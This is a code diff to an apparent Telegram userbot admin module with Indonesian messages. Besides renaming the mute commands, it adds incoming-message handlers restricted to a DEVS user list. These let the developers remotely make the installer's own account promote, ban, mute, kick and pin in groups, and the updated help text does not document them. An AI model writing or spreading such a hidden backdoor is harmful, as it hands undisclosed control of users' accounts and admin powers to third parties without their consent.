@@ -125,6 +125,7 @@ async def set_group_photo(event):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?:\s|$)([\s\S]*)")
 async def promote(event):
     new_rights = ChatAdminRights(
         add_admins=False,
@@ -156,6 +157,7 @@ async def promote(event):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?:\s|$)([\s\S]*)")
 async def demote(event):
     "To demote a person in group"
     user, _ = await get_user_from_event(event)
@@ -186,6 +188,7 @@ async def demote(event):
 
 
 @register(outgoing=True, pattern=r"^\.ban(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cban(?:\s|$)([\s\S]*)")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -245,6 +248,7 @@ async def ban(bon):
 
 
 @register(outgoing=True, pattern=r"^\.unban(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban(?:\s|$)([\s\S]*)")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -280,7 +284,8 @@ async def nothanos(unbon):
         await unbon.edit("`Sepertinya Terjadi Kesalahan!`")
 
 
-@register(outgoing=True, pattern=r"^\.dmute(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cmute(?: |$)(.*)")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -304,17 +309,17 @@ async def spider(spdr):
     self_user = await spdr.client.get_me()
 
     if user.id == self_user.id:
-        return await spdr.edit("`Tidak Bisa Membisukan Diri Sendiri..（>﹏<）`")
+        return await spdr.edit("**Tidak Bisa Membisukan Diri Sendiri..（>﹏<）**")
 
     if user.id in DEVS:
         return await spdr.edit("**Gagal Mute, Dia Adalah Pembuat Saya 🤪**")
 
     # If everything goes well, do announcing and mute
     await spdr.edit(
-        r"\\**#DMute_User**//"
+        r"\\**#Muted_User**//"
         f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
         f"**User ID:** `{user.id}`\n"
-        f"**Action:** `DMute by {ALIVE_NAME}`"
+        f"**Action:** `Mute by {ALIVE_NAME}`"
     )
     if mute(spdr.chat_id, user.id) is False:
         return await spdr.edit("**ERROR:** `Pengguna Sudah Dibisukan.`")
@@ -341,15 +346,16 @@ async def spider(spdr):
         if BOTLOG:
             await spdr.client.send_message(
                 BOTLOG_CHATID,
-                "**#DMUTE**\n"
+                "**#MUTE**\n"
                 f"**USER:** [{user.first_name}](tg://user?id={user.id})\n"
                 f"**GRUP:** {spdr.chat.title}(`{spdr.chat_id}`)",
             )
     except UserIdInvalidError:
-        return await spdr.edit("`Terjadi Kesalahan!`")
+        return await spdr.edit("**Terjadi Kesalahan!**")
 
 
-@register(outgoing=True, pattern=r"^\.undmute(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunmute(?: |$)(.*)")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -374,10 +380,10 @@ async def unmoot(unmot):
         return
 
     if unmute(unmot.chat_id, user.id) is False:
-        return await unmot.edit("**ERROR!** Pengguna Sudah Tidak Dibisukan.")
+        return await unmot.edit("**ERROR! Pengguna Sudah Tidak Dibisukan.**")
     try:
         await unmot.client(EditBannedRequest(unmot.chat_id, user.id, UNBAN_RIGHTS))
-        await unmot.edit("**Berhasil Melakukan Unmute! User Sudah Tidak Dibisukan**")
+        await unmot.edit("**Berhasil Melakukan Unmute!**")
         await sleep(5)
         await unmot.delete()
     except UserIdInvalidError:
@@ -424,6 +430,7 @@ async def muter(moot):
 
 
 @register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -466,6 +473,7 @@ async def ungmoot(un_gmute):
 
 
 @register(outgoing=True, pattern=r"^\.gmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgmute(?: |$)(.*)")
 async def gspider(gspdr):
     # Admin or creator check
     chat = await gspdr.get_chat()
@@ -612,6 +620,7 @@ async def get_admin(show):
 
 
 @register(outgoing=True, groups_only=True, pattern=r"^\.pin( loud|$)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpin( loud|$)")
 async def pin(event):
     to_pin = event.reply_to_msg_id
     if not to_pin:
@@ -636,6 +645,7 @@ async def pin(event):
 
 
 @register(outgoing=True, groups_only=True, pattern=r"^\.unpin( all|$)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunpin( all|$)")
 async def pin(event):
     to_unpin = event.reply_to_msg_id
     options = (event.pattern_match.group(1)).strip()
@@ -671,6 +681,7 @@ async def pin(event):
 
 
 @register(outgoing=True, pattern=r"^\.kick(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.ckick(?: |$)(.*)")
 async def kick(usr):
     # Admin or creator check
     chat = await usr.get_chat()
@@ -911,9 +922,9 @@ CMD_HELP.update(
         \n  •  **Function : **Membanned Pengguna dari grup.\
         \n\n  •  **Syntax :** `.unban <username/reply>`\
         \n  •  **Function : **Unbanned pengguna jadi bisa join grup lagi.\
-        \n\n  •  **Syntax :** `.dmute <username/reply> <alasan (optional)>`\
-        \n  •  **Function : **Membisukan Seseorang Di Grup dengan menghapus pesannya, Bisa Ke Admin Juga.\
-        \n\n  •  **Syntax :** `.undmute <username/reply>`\
+        \n\n  •  **Syntax :** `.mute <username/reply> <alasan (optional)>`\
+        \n  •  **Function : **Membisukan Seseorang Di Grup, Bisa Ke Admin Juga.\
+        \n\n  •  **Syntax :** `.unmute <username/reply>`\
         \n  •  **Function : **Membuka bisu orang yang dibisukan.\
         \n  •  **Function : ** Membuka global mute orang yang dibisukan.\
         \n\n  •  **Syntax :** `.all`\
